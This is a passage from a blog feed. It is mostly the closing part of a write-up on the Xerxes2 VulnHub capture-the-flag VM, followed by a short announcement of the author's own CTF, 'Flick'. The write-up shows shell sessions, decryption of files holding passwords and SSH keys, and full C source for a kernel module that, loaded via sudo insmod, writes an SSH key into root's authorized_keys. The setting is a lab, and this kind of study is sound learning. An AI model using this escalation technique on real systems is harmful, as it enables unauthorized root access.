uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
$
</code></p>

<p>Oly. Crap. That. Was. Awesome. :D :D</p>

<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>

<h2>becoming korenchkin</h2>

<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>

<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>

<p><code>bash polito home
polito@xerxes2:~$ ls -lh
total 43M
-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
polito@xerxes2:~$ crontab -l
[...]
@reboot while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
polito@xerxes2:~$
</code></p>

<p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>

<p><img class="<a" src="href="https://i.imgur.com/WMuVK8O.png">https://i.imgur.com/WMuVK8O.png</a>"></p>

<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>

<p><code>bash polito.pdf File
polito@xerxes2:~$ file -k polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)
</code></p>

<p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>

<p><code>bash polito.pdf headers
00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&lt;&lt;&gt;&gt;.str
00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
</code></p>

<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>

<p>```bash
root@kali:~# head -c 512 polito.pdf > first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)</p>

<p>root@kali:~# tail -c +512 polito.pdf > second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
```</p>

<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>

<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>

<p><img class="<a" src="href="https://i.imgur.com/1HFOfwc.png">https://i.imgur.com/1HFOfwc.png</a>"></p>

<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>

<p>```bash GPG decrypt
polito@xerxes2:~$ gpg -d dump.gpg > decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected</p>

<p>polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data</p>

<p>polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r&mdash;r&mdash; 1 polito polito 126M Aug 10 02:12 decrypted_dump
```</p>

<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>

<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>

<p><code>bash Finding korenchkin.tar.enc password
polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
</code></p>

<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>

<p>```bash decrypting korenchkin.tar.enc
polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar</p>

<p>polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive (GNU)</p>

<p>polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
```</p>

<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>

<p>```bash SSH as korenchkin
root@kali:~# ssh -i korenchkin.key <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#107;&#111;&#x72;&#101;&#110;&#99;&#x68;&#107;&#105;&#x6e;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x35;&#x36;&#46;&#49;&#x30;&#x32;">&#x6b;&#x6f;&#x72;&#101;&#110;&#99;&#104;&#x6b;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#x36;&#x2e;&#49;&#48;&#x32;</a></p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>You have new mail.
korenchkin@xerxes2:~$
```</p>

<p><em>You have new mail.</em></p>

<h2>becoming root</h2>

<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>

<p>```bash korenchkin sudo
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User korenchkin may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
</code></pre>

<p>```</p>

<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>

<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>

<p>```c hello.c</p>

<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>

<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>

<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>

<p>static int __init hello_start(void)
{</p>

<pre><code>printk(KERN_INFO "Loading hello module...\n");
return 0;
</code></pre>

<p>}</p>

<p>static void __exit hello_end(void)
{</p>

<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
</code></pre>

<p>}</p>

<p>module_init(hello_start);
module_exit(hello_end);
```</p>

<p>```make hello Makefile
obj-m += hello.o</p>

<p>all:</p>

<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
</code></pre>

<p>clean:</p>

<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre>

<p>```</p>

<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>

<p><code>``bash hello kernel module testing
korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kern/hello.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/hello.mod.o
  LD [M]  /home/korenchkin/kern/hello.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'</p>

<p>korenchkin@xerxes2:~/kern$ sudo insmod hello.ko</p>

<p>korenchkin@xerxes2:~/kern$ dmesg | tail
[&hellip;]
[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module&hellip;
korenchkin@xerxes2:~/kern$
```</p>

<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>

<p><em>insert loud crash and burn sound here</em></p>

<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>

<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>

<p>```bash Rewritten hello.c to rooted.c</p>

<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>

<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>

<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>

<p>/<em> For our shell ^_^ </em>/</p>

<h1>include&lt;linux/kmod.h></h1>

<p>int get_root (void)
{</p>

<pre><code>char * envp[] = { "HOME=/", NULL };
char *argv[] = { "/bin/bash", "-c", "/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys", NULL};
printk(KERN_INFO "Call Usermodehelper...\n");
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
printk(KERN_INFO "Done usermodehelper...\n");
return 0;
</code></pre>

<p>}</p>

<p>static int __init hello_start(void)
{</p>

<pre><code>printk(KERN_INFO "Loading rooted module...\n");
return get_root();
return 0;
</code></pre>

<p>}</p>

<p>static void __exit hello_end(void)
{</p>

<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
</code></pre>

<p>}</p>

<p>module_init(hello_start);
module_exit(hello_end);
```</p>

<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>

<p>```bash Xerxes2 rooting
korenchkin@xerxes2:~/kern$ vi rooted.c</p>

<p>korenchkin@xerxes2:~/kern$ vi Makefile</p>

<p>korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kern/rooted.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/rooted.mod.o
  LD [M]  /home/korenchkin/kern/rooted.ko
make[1]: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'</p>

<p>korenchkin@xerxes2:~/kern$ echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&rdquo; > /tmp/pubkey</p>

<p>korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko</p>

<p>korenchkin@xerxes2:~/kern$ dmesg | tail
[   14.512040] eth0: no IPv6 routers present
[  290.023022] Clocksource tsc unstable (delta = 4686567555 ns)
[  290.025022] Switching to clocksource acpi_pm
[57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14
[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module&hellip;
[74155.086393] Loading rooted module&hellip;
[74155.086397] Call Usermodehelper&hellip;
[74155.086449] Done usermodehelper&hellip;</p>

<p>korenchkin@xerxes2:~/kern$ logout
Connection to 192.168.56.102 closed.</p>

<p>root@kali:~/Desktop/xeres2# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#114;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#x36;&#x2e;&#x31;&#48;&#50;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#x32;</a> -i delacroix</p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)</p>

<p>root@xerxes2:~# cat /root/flag.txt</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<pre><code>congratulations on beating xerxes2!

I hope you enjoyed it as much as I did making xerxes2. 
xerxes1 has been described as 'weird' and 'left-field'
and I hope that this one fits that description too :)

Many thanks to @TheColonial &amp; @rasta_mouse for testing!

Ping me on #vulnhub for thoughts and comments!

                  @barrebas, July 2014
</code></pre>

<p>root@xerxes2:~#
```</p>

<h2>conclusion</h2>

<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>

<p>Now, the next step? OSCP :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[flick - can you find the flag?]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/"/>
    <updated>2014-08-07T12:17:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag</id>
    <content type="html"><![CDATA[<p><img class="<a" src="href="http://i.imgur.com/kxwW1J8.png">http://i.imgur.com/kxwW1J8.png</a>"></p>

<h3>TL;DR</h3>

<p>I made a CTF! You should try it! Find it <a href="http://vulnhub.com/entry/flick-1,99/">on Vulnhub</a></p>

<h2>foreword</h2>

<p>So, security CTF&rsquo;s are fun. A lot of fun. And can be one heck of a time sink! Checking my laptops time and realizing its 3am on a week night is normal when I get pulled into one. The frustration, the trolls, the tremendous amounts of learning is all part of the experience of a successful CTF in my opinion.</p>

<h2>preparation</h2>

<p>Having done a few now with varying degrees of success has inspired me to attempt to do the same. So, off I went to CTF island and came back a weekend later with &ldquo;Flick&rdquo;. There is no real meaning to &ldquo;Flick&rdquo;. In fact, the name is the result of: &ldquo;What can I call it?&rdquo; &lt; insert 5u seconds > &ldquo;Flick?&rdquo;.</p>

<h2>details</h2>

<p>&ldquo;Flick&rdquo; aims to give you chance to learn something new. While some things may be trivial for the seasoned penetration tester by day, there may also be one or two things to learn.</p>

<p>As far as hints go, there is not much to give in the beginning. You have to <em>find</em> the flag.txt. It is possible to read it without having root command execution, however, as a added challenge, can you get root command execution? :)</p>

<h2>summary</h2>

<p>I look forward to hearing your experiences with it and good luck! You can find me in #vulnhub on freenode or on twitter @leonjza</p>
]]></content>
  </entry>
  
</feed>
